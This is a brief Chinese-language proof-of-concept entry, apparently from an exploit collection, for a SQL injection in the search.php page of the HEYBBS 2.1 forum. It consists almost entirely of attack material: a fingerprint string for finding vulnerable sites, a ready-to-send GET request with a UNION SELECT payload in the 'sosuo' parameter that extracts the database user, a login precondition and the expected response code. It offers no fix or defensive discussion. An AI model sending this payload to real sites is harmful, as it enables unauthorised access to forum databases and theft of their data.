# HEYBBS2.1论坛search.php存在sql注入漏洞

HEYBBS2.1 ｜ SQL注入 ｜ —
- **指纹**：`Body="微社区, 微论坛, 微博客"`
- **请求**：`GET /search.php?sosuo=qq%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,CONCAT(0xc,user(),0xc),NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1`

**Payload**
```
登录论坛账号然后发送下面POC进行测试
Host:
```
- **响应特征**：200